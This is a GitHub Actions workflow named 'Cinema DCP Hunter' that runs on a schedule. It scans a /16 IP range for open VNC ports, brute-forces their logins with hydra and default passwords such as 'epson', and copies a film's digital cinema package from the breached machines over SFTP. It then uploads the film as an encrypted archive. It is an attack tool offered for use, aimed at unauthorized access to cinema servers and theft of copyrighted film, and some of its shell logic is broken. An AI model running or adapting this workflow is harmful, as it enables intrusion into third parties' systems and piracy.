name: Cinema DCP Hunter â€“ Demon Slayer Part 1

on:
  schedule:
    - cron: '0 */6 * * *'   # every 6 hours
  workflow_dispatch:

jobs:
  hunt:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    runs-on: ${{ matrix.os }}

    steps:
      - name: Install Linux tools
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full

      - name: Install Windows tools
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          choco install nmap rclone 7zip -y --no-progress
          # Download pre-compiled Hydra x64 binary
          Invoke-WebRequest -Uri "https://github.com/vanhauser-thc/thc-hydra/releases/download/v9.5/hydra-9.5-win.zip" -OutFile hydra.zip
          7z x hydra.zip -oC:\hydra -y
          echo "C:\hydra" | Out-File -Append $env:GITHUB_PATH -Encoding utf8
          # small password list for brute
          Set-Content -NoNewline -Path C:\hydra\passwords.txt -Value "epson`nadmin`nprojector`n123456`npassword"

      - name: Scan for open VNC
        id: scan
        run: |
          if [ "$RUNNER_OS" == "Linux" ]; then
            nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
          else
            nmap -p5900 --open 210.172.0.0/16 -oG vnc.txt
            findstr /R "5900/open" vnc.txt > vnc_hosts.txt
          fi
        shell: bash

      - name: Brute VNC passwords
        id: brute
        run: |
          if [ "$RUNNER_OS" == "Linux" ]; then
            while read ip; do
              hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
              [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
            done < vnc_hosts.txt
          else
            while read ip; do
              C:\hydra\hydra.exe -l epson -P C:\hydra\passwords.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
              if [ -s hydra_$ip.txt ]; then echo "$ip" >> valid_ips.txt; fi
            done < vnc_hosts.txt
          fi
        shell: bash

      - name: Check if any valid IPs
        id: valid
        run: echo "found=$( [ -s valid_ips.txt ] && echo true || echo false )" >> $GITHUB_OUTPUT
        shell: bash

      - name: Mount, copy & compress DCP
        if: steps.valid.outputs.found == 'true'
        id: dcp
        run: |
          mkdir -p staging
          while read ip; do
            if [ "$RUNNER_OS" == "Linux" ]; then
              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
              rclone lsf relay$ip:/ | grep -iq dsic && {
                rclone copy relay$ip:/DSIC_P1 staging/DSIC_P1 -P --transfers=32
                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging/DSIC_P1
                echo "movie_found=true" >> $GITHUB_OUTPUT
                break
              }
            else
              rclone config create relay$ip sftp host=$ip user=epson port=22 pass="$(grep $ip hydra_*.txt | awk '{print $NF}')"
              rclone lsf relay$ip:/ | findstr /i dsic && (
                rclone copy relay$ip:/DSIC_P1 staging\DSIC_P1 -P --transfers=32
                7z a -pInfinity2025 -mhe=on DSIC_P1.7z staging\DSIC_P1
                echo "movie_found=true" >> $GITHUB_OUTPUT
                goto :break
              )
            fi
          done < valid_ips.txt
          :break
        shell: bash

      - name: Upload artifact
        if: steps.dcp.outputs.movie_found == 'true'
        uses: actions/upload-artifact@v4
        with:
          name: DSIC_P1_DCP_${{ matrix.os }}
          path: DSIC_P1.7z
          retention-days: 7

      - name: Signal success
        if: steps.dcp.outputs.movie_found == 'true'
        run: echo "movie found and downloaded"
